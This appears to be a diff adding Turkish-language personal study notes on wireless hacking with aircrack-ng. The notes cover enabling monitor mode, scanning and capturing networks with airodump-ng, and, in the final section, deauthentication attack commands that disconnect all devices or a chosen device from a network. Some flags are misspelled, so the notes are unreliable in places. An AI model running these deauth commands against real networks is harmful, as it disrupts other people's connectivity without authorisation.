@@ -1,0 +1,113 @@
+
+---------------------------
+
+	WIFI KART MODLARI
+
+* Managed : İnternete bağlanabiliyoruz
+
+* Monitor : Bağlı olmadığımız ağlar hakkında bilgi toplayabiliyoruz
+
+---------------------------
+
+	WIFI KARTI MONİNOT MODE ALMA
+
+I.
+	* Monitor moda geçme :
+		- airmon-ng check kill
+			> Bazen direkt star verince hata verebiliyor, kart üzerinde çalışan servisler olunca.
+			Kart üzerinde çalışan servisleri kapatıyoruz
+
+		- airmon-ng start wlan0
+			> Monitor moda alır.
+
+	* Monitor Moddan çıkma :
+		- airmon-ng stop wlan0 
+			> Monitor modu kapatır.
+
+
+II.
+	* Monitor moda geçme :
+		- ifconfig wlan0 down 
+		- iwconfig wlan0 mode monitor
+		- ifconfig wlan0 up 
+
+	* Monitor Moddan çıkma :
+		- ifconfig wlan0 down 
+		- iwconfig wlan0 mode managed
+		- ifconfig wlan0 up
+
+
+NOT : "iwconfig" yaparak kartın modunu görüntüleyebiliriz 
+
+---------------------------
+
+	MONUTOR MODU BELLİ BİR KANALDAN BAŞLATMA
+
+* airmon-ng start wlan0 8
+
+--------------------------
+
+	AĞLAR ÜZERİNDEN BİLGİ TOPLAMA (airodump-ng)
+
+* airodump-ng : Kablosuz ağları taramak ve veri paketlerini yakalamak için kullanılır.
+
+* Ağ taramayı başlatma :
+	- Öncelikli olarak kablosuz ağ kartının monitor moda alınması gerek
+	- airodump-ng wlan0
+
+--------------------------
+
+	"airodump-ng" EKRANI
+
+* monitor moda geçtiğimizde karşımıza çıkan ekran'ın üst bölümü için başlıklar : (Erişim Noktası/Access Point Bilgileri)
+	- BSSID	  : Modem veya router'ın MAC adresleri
+	- PWR 	  : Bize ne kadar yakın olduğunu belirtmek için kullanılır. (Sinyalin değeri negatifse yakındır)
+	- Beacons : Erişim noktası tarafından gönderilen ve ağın varlığını bildiren sinyallerin sayısını gösterir.
+	- #DATA   : Belirli bir BSSID'den gelen veri paketlerinin sayısını gösterir
+	- #/s     : Saniyede gönderilen veri paketi
+	- CH      : Hangi kanalda çalıştığını gösterir.
+	- MB      : Erişim noktasının maksimum veri hızını gösterir
+	- ENC     : Şifreleme yöntemi	
+		> WEP, WPA, WPA2
+	- CIPHER  : Şifreleme yönteminde kullanılan şifreleme algoritması
+		> CCMP, TKIP
+	- AUTH    : Ağın kimlik doğrulama türünü gösterir.
+		> PSK, MGT
+	- ESSID   : Modemin adı
+
+* monitor moda geçtiğimizde karşımıza çıkan ekran'ın alt bölümü için başlıklar : (İstasyon/Statiton Bilgileri)
+	- BSSID 	: İStasyonların MAC adreslerini gösterir. 
+	- Stattion 	: Kablosuz ağa başlanmış cihazların MAC adresleri
+	- PWR 		: Uzaklığını belirtir
+	- Frames 	: Cihazın ne kadar veri trafiği oluşturduğunu gösterir
+	- Probels 	: İstasyonun aradığı ağ isimlerini (SSID) gösterir.
+	- Rate 		: İstasyonun o an veri aktarımı yaptığı hzıdır.
+	- Lost 		: İstasyon tarafından gönderilen paketlerin jayıp sayısını gösterir.
+
+----------------------------
+
+	"airodump-ng" EXAMPLE
+
+* Çevredeki ağlar hakkında genel bir bilgi toplama
+	- airmon-ng check kill
+	- airmon-ng start wlan0
+	- airodump-ng wlan0 : Monitor mod dinlemeye başlar
+
+* Belirli bir ağ üzerinde bilgi toplama
+	- airodump-ng  --chanell <AP Kanalı>  --bssid <AP Mac>  --write airodumptest wlan0
+
+---------------------------
+
+	DEUTHENTICATION ATTACK
+
+* Ağa bağlı olanları ağdan düşürmek için kullanılan komut -> "aireplay-ng"
+
+* O ağa bağlı tüm cihazlara saldırabiliriz
+	- aireplay-ng --deauth <PaketSayısı> -a <ModemMacAdresi> wlan0
+	- aireplay-ng --deauth 10000 -a 00:11:22:33:44:55 (example) 
+
+* Ya da o ağa bağlı bir cihazı ağdan düşürmek için saldırabiliriz
+	- aireplay-ng --deauth <PaketSayısı> -a <ModemMacAdresi> -c <HedefMacAdresi> wlan0
+	- aireplay-ng --deauth 10000 -a 00:11:22:33:44:55 -c 66:77:88:99:00:11 wlan0 (example)
+
+--------------------------
